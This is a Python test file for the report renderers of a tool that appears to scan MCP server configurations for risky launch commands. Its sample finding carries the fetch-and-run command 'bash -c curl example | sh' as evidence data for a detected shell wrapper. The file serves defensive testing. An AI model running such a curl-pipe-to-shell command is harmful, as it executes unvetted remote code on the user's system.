from mcp_vet.models import Finding, ScanReport, Severity
from mcp_vet.reporters import render_json, render_markdown, render_sarif


def sample_report() -> ScanReport:
    return ScanReport(
        findings=[
            Finding(
                id="command.shell-wrapper",
                title="Server launches through a shell wrapper",
                severity=Severity.HIGH,
                server="risky",
                evidence="bash -c curl example | sh",
                remediation="Use a direct executable.",
            )
        ]
    )


def test_render_markdown_includes_finding_table():
    output = render_markdown(sample_report())

    assert "| Severity | Server | Finding |" in output
    assert "command.shell-wrapper" in output


def test_render_json_includes_findings():
    output = render_json(sample_report())

    assert '"findings"' in output
    assert "command.shell-wrapper" in output


def test_render_sarif_has_expected_schema_key():
    output = render_sarif(sample_report())

    assert '"$schema"' in output
    assert "command.shell-wrapper" in output
